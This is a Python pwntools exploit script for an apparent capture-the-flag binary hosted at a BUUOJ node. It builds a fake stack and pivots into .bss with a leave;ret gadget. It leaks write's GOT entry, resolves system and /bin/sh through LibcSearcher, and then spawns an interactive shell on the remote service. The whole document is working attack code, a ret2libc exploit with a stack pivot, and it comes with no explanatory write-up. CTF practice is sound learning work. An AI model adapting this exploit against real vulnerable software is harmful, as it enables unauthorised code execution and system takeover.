from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29191)
elf = ELF('./pwn')

# construct fake stack
payload = p32(elf.symbols['m1'] + 20)
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vul_function'])	# return address, return to function
payload += p32(1)					# first argument of write: stdout
payload += p32(elf.got['write'])	# second argument of write: .got address of 'write'
payload += p32(4)					# third argument of write: write length

io.sendlineafter(b'What is your name?', payload)

payload = cyclic(0x18)
payload += p32(elf.symbols['s'])	# fake ebp
payload += p32(0x8048511)			# return to 'leave; retn' to change rsp into .bss segment

io.sendafter(b'What do you want to say?', payload)

write = u32(io.recv(4))
print(hex(write))
libc = LibcSearcher('write', write)
base = write - libc.dump('write')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

# we can change the stack after ebp directly through 'vul_function'
payload = p32(0xdeadbeef) * 3
payload += p32(sys)
payload += p32(0xdeadbeef)
payload += p32(binsh)

io.sendlineafter(b'What is your name?', payload)
io.sendlineafter(b'What do you want to say?', b'Hacked')

# gdb.attach(io)
io.interactive()